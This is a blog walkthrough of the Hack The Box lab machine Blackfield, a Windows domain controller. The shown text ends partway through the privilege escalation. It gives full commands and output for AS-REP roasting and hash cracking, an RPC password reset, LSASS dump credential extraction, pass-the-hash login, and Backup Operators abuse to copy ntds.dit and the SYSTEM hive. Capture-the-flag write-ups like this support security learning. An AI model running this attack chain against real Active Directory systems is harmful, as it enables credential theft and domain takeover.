<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Hack the Box - Blackfield" /><meta property="og:locale" content="en" /><meta name="description" content="This is my guide to the HackTheBox Windows machine Blackfield. This is my first Hard difficulty box that I’ve rooted." /><meta property="og:description" content="This is my guide to the HackTheBox Windows machine Blackfield. This is my first Hard difficulty box that I’ve rooted." /><link rel="canonical" href="https://tid4l.github.io/posts/HTB-Blackfield/" /><meta property="og:url" content="https://tid4l.github.io/posts/HTB-Blackfield/" /><meta property="og:site_name" content="TidalSec" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-07-08T13:00:00-05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hack the Box - Blackfield" /><meta name="twitter:site" content="@twitter_username" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2020-07-08T13:00:00-05:00","datePublished":"2020-07-08T13:00:00-05:00","description":"This is my guide to the HackTheBox Windows machine Blackfield. This is my first Hard difficulty box that I’ve rooted.","headline":"Hack the Box - Blackfield","mainEntityOfPage":{"@type":"WebPage","@id":"https://tid4l.github.io/posts/HTB-Blackfield/"},"url":"https://tid4l.github.io/posts/HTB-Blackfield/"}</script><title>Hack the Box - Blackfield | TidalSec</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="TidalSec"><meta name="application-name" content="TidalSec"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/avi/avi.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">TidalSec</a></div><div class="site-subtitle font-italic">Cybersecurity.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/tid4l" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['example','doamin.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Hack the Box - Blackfield</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hack the Box - Blackfield</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/username">Chris</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1594231200" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2020-07-08 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1814 words"> <em>10 min</em> read</span></div></div></div><div class="post-content"><p>This is my guide to the HackTheBox Windows machine <em>Blackfield</em>. This is my first <strong>Hard</strong> difficulty box that I’ve rooted.</p><hr /><blockquote class="prompt-warning"><div><p>These HTB writeups have been migrated from a standalone repository for ease of access. However, I wrote these to learn and can’t attest to the accuracy of my thoughts.</p></div></blockquote><p><img data-src="/assets/img/posts/htb/07-2020-5/info.PNG" alt="" data-proofer-ignore> <em>Task: Find <a href="#user-flag">user.txt</a> and <a href="#root-flag">root.txt</a></em></p><h2 id="penetration-methodologies"><span class="mr-2">Penetration Methodologies</span><a href="#penetration-methodologies" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p><strong>Scanning</strong></p><ul><li>nmap</ul><p><strong>Enumeration</strong></p><ul><li>Openly available shares</ul><p><strong>Exploitation</strong></p><ul><li>Kerberoasting - harvest non-preauth responses</ul><p><strong>Priv Esc</strong></p><ul><li><p>LSASS dump</p><li><p>Group policy abuse</p></ul><h2 id="user-flag"><span class="mr-2">User Flag</span><a href="#user-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>First, let’s use <code class="language-plaintext highlighter-rouge">nmap</code> to scan <em>Blackfield</em>.</p><ul><li><p><strong>sC</strong>: Enable common scripts</p><li><p><strong>sV</strong>: version and service on the port</p><li><p><strong>O</strong>: remote OS detection using fingerprinting</p></ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre><td class="rouge-code"><pre><span class="c"># Nmap 7.80 scan initiated Tue Jul  7 13:43:23 2020 as: nmap -sC -sV -O -oA scan192 10.10.10.192</span>
Nmap scan report <span class="k">for </span>10.10.10.192
Host is up <span class="o">(</span>0.12s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 993 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    <span class="nb">bind
</span>88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2020-07-08 01:48:18Z<span class="o">)</span>
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: BLACKFIELD.local0., Site: Default-First-Site-Name<span class="o">)</span>
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: BLACKFIELD.local0., Site: Default-First-Site-Name<span class="o">)</span>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V<span class="o">=</span>7.80%I<span class="o">=</span>7%D<span class="o">=</span>7/7%Time<span class="o">=</span>5F04C269%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>DNSVe
SF:rsionBindReqTCP,20,<span class="s2">"</span><span class="se">\0\x</span><span class="s2">1e</span><span class="se">\0\x</span><span class="s2">06</span><span class="se">\x</span><span class="s2">81</span><span class="se">\x</span><span class="s2">04</span><span class="se">\0\x</span><span class="s2">01</span><span class="se">\0\0\0\0\0\0\x</span><span class="s2">07version</span><span class="se">\x</span><span class="s2">
SF:04bind</span><span class="se">\0\0\x</span><span class="s2">10</span><span class="se">\0\x</span><span class="s2">03"</span><span class="o">)</span><span class="p">;</span>
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches <span class="k">for </span>host
Service Info: Host: DC01<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h04m28s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   <span class="nb">date</span>: 2020-07-08T01:50:49
|_  start_date: N/A

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
<span class="c"># Nmap done at Tue Jul  7 13:46:58 2020 -- 1 IP address (1 host up) scanned in 215.40 seconds</span>
</pre></table></code></div></div><p>Okay, our results are back and it looks like this box is a domain controller, most of the open ports are typically what we should see on a DC.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-O</span> <span class="nt">-p-</span> <span class="nt">-oA</span> full180 10.10.10.192
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
</pre></table></code></div></div><p>A full port scan also reveals that port 5985 is open, which allows remote credentialed access with WinRM 2.0 (Microsoft Windows Remote Management). Next, let’s try to enumerate some of the available services for more information.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>enum4linux 10.10.10.192
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">enum4linux</code>, a tool to enumerate Windows or Samba systems, yields little. Let’s see if any shares are viewable without credentials.</p><p><img data-src="/assets/img/posts/htb/07-2020-5/smb-shares.png" alt="" data-proofer-ignore></p><p>Success. Trying each one, it looks like we can access the profiles$ share.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>smbclient <span class="se">\\\\</span>10.10.10.192<span class="se">\\</span>profiles<span class="err">$</span>
</pre></table></code></div></div><p>This reveals a lot of user directories, none of which are accessible. This does, however, give us some credentials to start enumerating. We can use a tool from <a href="https://github.com/SecureAuthCorp/impacket">Impacket</a> which will check to see if any users have the property “Do not require Kerberos preauthentication” set (<code class="language-plaintext highlighter-rouge">UF_DONT_REQUIRE_PREAUTH</code>). If this is the case, we will receive a hash.</p><p>This is a subset of a process called “kerberoasting”, which is described in more detail in <a href="https://www.tarlogic.com/en/blog/how-to-attack-kerberos/">this article</a>. Let’s grab all the usernames and save them into a list.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nv">$ </span>GetNPUsers.py <span class="nt">-dc-ip</span> 10.10.10.192 BLACKFIELD.LOCAL/ <span class="nt">-usersfile</span> <span class="nb">users</span> <span class="nt">-format</span> hashcat <span class="nt">-outputfile</span> user.hash
<span class="o">[</span>...]
<span class="nv">$krb5asrep$23$support</span>@BLACKFIELD.LOCAL:03fcde2dba3e2be20f5f7671f28a7200<span class="nv">$cfc16761e1295b96b10714ee0424df3e1df623d73e606031e5787993565bcbadd2a2228e541aedd208d66e2f185e491306b0aabb9d43b99bc4e86d4370d6fd819f5fa9b11ccd0b07084347f7d854e129b64819de43f9e4ed751e32d339af4dc91d30a4a9fc3d32fa81fff5cb6a0abaf024c0402f47f53f228e280a8867cd609f9abb8b583fe03eade58eb980a56996e6093e04cdd20b0eb82c405d02ec9b18c491e304dce940b5a3460f4c02e4c72cf0250806230bd00c31d4588c2dd985ed5a85794aa3f1413a26c941895dedeefd33164f9f620cd54ccacbe65dfe37c6ec394249d8b2212db977f8026c54e8be9f51e3a13632</span>
<span class="o">[</span>...]
</pre></table></code></div></div><p>We receive a hash for the support user. We also can see that the users audit2020 and svc_backup are still active accounts. Lets use <code class="language-plaintext highlighter-rouge">john</code> to see if we can crack the hash and receive a password.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">sudo </span>john user.hash <span class="nt">--wordlist</span><span class="o">=</span>rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>krb5asrep, Kerberos 5 AS-REP etype 17/18/23 <span class="o">[</span>MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x]<span class="o">)</span>
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
<span class="c">#00^BlackKnight  ($krb5asrep$23$support@BLACKFIELD.LOCAL)</span>
1g 0:00:00:38 DONE <span class="o">(</span>2020-07-07 14:54<span class="o">)</span> 0.02623g/s 376048p/s 376048c/s 376048C/s <span class="c">#13Carlyn..#*burberry#*1990</span>
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed
</pre></table></code></div></div><p>Success, we now have some credentials; the password #00^BlackKnight, most likely for the support user.</p><p>We have no luck trying our newly acquired creds on the various services available, but the user we have access to, support, is indicative of where we may have access. We can perform various helpdesk/support functions with RPC, so let’s see if we can change the password of one of the other accounts we know about, potentially giving us elevated access.</p><p>We’ll use <code class="language-plaintext highlighter-rouge">rpcclient</code> to give this a shot.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nv">$ </span>rpcclient <span class="nt">-U</span> <span class="s2">"support"</span> 10.10.10.192
Enter WORKGROUP<span class="se">\s</span>upport<span class="s1">'s password:
rpcclient $&gt;
</span></pre></table></code></div></div><p>Okay, we have RPC access. <a href="https://malicious.link/post/2017/reset-ad-user-password-with-linux/">This article</a> has excellent information on how to perform a password reset. Let’s give it a shot.</p><pre><code class="language-cli">rpcclient $&gt; setuserinfo2 audit2020 23 'hello1234!'
</code></pre><p>The account that we can reset the password successfully for is audit2020. Let’s backtrack a little with our new credentials and see what the audit2020 user can access. We’ll try enumerating the various SMB shares that we found earlier.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nv">$ </span>smbclient <span class="se">\\\\</span>10.10.10.192<span class="se">\\</span>forensic <span class="nt">-U</span> audit2020%hello1234!
Try <span class="s2">"help"</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span>
</pre></table></code></div></div><p>We can access the forensic share. Let’s see what we can find.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="o">&gt;</span> <span class="nb">dir</span>
  <span class="nb">.</span>                                   D        0  Sun Feb 23 07:03:16 2020
  ..                                  D        0  Sun Feb 23 07:03:16 2020
  commands_output                     D        0  Sun Feb 23 12:14:37 2020
  memory_analysis                     D        0  Thu May 28 15:28:33 2020
  tools                               D        0  Sun Feb 23 07:39:08 2020

                7846143 blocks of size 4096. 3986813 blocks available
</pre></table></code></div></div><p>The memory_analysis drive has a <code class="language-plaintext highlighter-rouge">lsass.zip</code> file. In Windows, the LSASS memory typically stores credentials for users on the machine. Some attacks on Windows environments include dumping LSASS and using a tool like <code class="language-plaintext highlighter-rouge">mimikatz</code> to extract passwords. Fortunately for us, it looks like we can just grab this file now. Additionally, since this isn’t a new dump as far as we can tell, we don’t necessarily know if these credentials will still be valid. Let’s see what we can find.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="o">&gt;</span> <span class="nb">cd </span>memory_analysis
<span class="o">&gt;</span> get lsass.zip
</pre></table></code></div></div><p>I’ll use the tool <a href="https://github.com/skelsec/pypykatz">pypykatz</a>, which is like <code class="language-plaintext highlighter-rouge">mimikatz</code> but helps with locally extracting credentials. A great guide can be found <a href="https://en.hackndo.com/remote-lsass-dump-passwords/#linux--windows">here</a> on Hackndo.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="nv">$ </span>pypykatz lsa minidump lsass.DMP
<span class="o">[</span>...]
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406458
        <span class="o">==</span> MSV <span class="o">==</span>
                Username: svc_backup
                Domain: BLACKFIELD
                LM: NA
                NT: 9658d1d1dcd9250115e2205d9f48400d
                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
<span class="o">[</span>...]
</pre></table></code></div></div><p>We now have a few different accounts and their NTLM hashes. We can attempt a pass-the-hash attack with <code class="language-plaintext highlighter-rouge">evil-winrm</code>, which tries remote access utilizing port 5985. Enumerating through our options, we can successfully log in with the svc_backup account.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>evil-winrm <span class="nt">-H</span> 9658d1d1dcd9250115e2205d9f48400d <span class="nt">-u</span> svc_backup <span class="nt">-i</span> 10.10.10.192
</pre></table></code></div></div><p>Let’s grab the user flag.</p><p><img data-src="/assets/img/posts/htb/07-2020-5/user-flag.png" alt="" data-proofer-ignore></p><h2 id="root-flag"><span class="mr-2">Root Flag</span><a href="#root-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Now, on to root. Let’s see what kind of access we have with the svc_backup user.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="err">&gt;</span><span class="w"> </span><span class="n">net</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="nx">svc_backup</span><span class="w"> </span><span class="nx">/domain</span><span class="w">
</span><span class="n">User</span><span class="w"> </span><span class="nx">name</span><span class="w">                    </span><span class="nx">svc_backup</span><span class="w">
</span><span class="n">Full</span><span class="w"> </span><span class="nx">Name</span><span class="w">
</span><span class="n">Comment</span><span class="w">
</span><span class="nx">User</span><span class="s1">'s comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/23/2020 10:54:48 AM
Password expires             Never
Password changeable          2/24/2020 10:54:48 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   2/23/2020 11:03:50 AM

Logon hours allowed          All

Local Group Memberships      *Backup Operators     *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.
</span></pre></table></code></div></div><p>Looks like we are apart of the Backup Operators local group. A little research reveals that we can abuse this group to elevate our privileges. More information can be found <a href="https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#abusing-backup-operators-group">here</a>.</p><p>First, let’s create a script text file that will contain parameters for the <code class="language-plaintext highlighter-rouge">diskshadow</code> command:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>set context persistent nowriters  
set metadata c:\windows\system32\spool\drivers\color\example.cab  
set verbose on  
begin backup  
add volume c: alias mydrive  

create  

expose %mydrive% w:  
end backup
</pre></table></code></div></div><p>We will upload it to the box with <code class="language-plaintext highlighter-rouge">evil-winrm</code> and use the <code class="language-plaintext highlighter-rouge">diskshadow</code> command.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="err">&gt;</span><span class="w"> </span><span class="n">upload</span><span class="w"> </span><span class="nx">script.txt</span><span class="w">
</span><span class="err">&gt;</span><span class="w"> </span><span class="n">diskshadow</span><span class="w"> </span><span class="nx">/s</span><span class="w"> </span><span class="nx">script.txt</span><span class="w">
</span></pre></table></code></div></div><p>In order to emulate the backup software, we need to upload two DLLs found <a href="https://github.com/giuliano108/SeBackupPrivilege">here</a>, import them, and use this to access the shadow copy back up.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="err">&gt;</span><span class="w"> </span><span class="n">upload</span><span class="w"> </span><span class="nx">SeBackupPrivilegeCmdLets.dll</span><span class="w">
</span><span class="err">&gt;</span><span class="w"> </span><span class="n">upload</span><span class="w"> </span><span class="nx">SeBackupPrivilegeUtils.dll</span><span class="w">
</span><span class="err">&gt;</span><span class="w"> </span><span class="n">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\SeBackupPrivilegeCmdLets.dll</span><span class="w">
</span><span class="err">&gt;</span><span class="w"> </span><span class="n">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\SeBackupPrivilegeUtils.dll</span><span class="w">
</span></pre></table></code></div></div><p>Next, we’ll grab the <code class="language-plaintext highlighter-rouge">ntds.dit</code> database file from the shadow copy, then dump the SYSTEM hive.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="err">&gt;</span><span class="w"> </span><span class="n">Copy-FileSeBackupPrivilege</span><span class="w"> </span><span class="nx">w:\windows\NTDS\ntds.dit</span><span class="w"> </span><span class="nx">c:\temp\ntds.dit</span><span class="w"> </span><span class="nt">-Overwrite</span><span class="w">
</span><span class="err">&gt;</span><span class="w"> </span><span class="n">reg</span><span class="w"> </span><span class="nx">save</span><span class="w"> </span><span class="nx">HKLM\SYSTEM</span><span class="w"> </span><span class="nx">c:\temp\system.hive</span><span class="w">
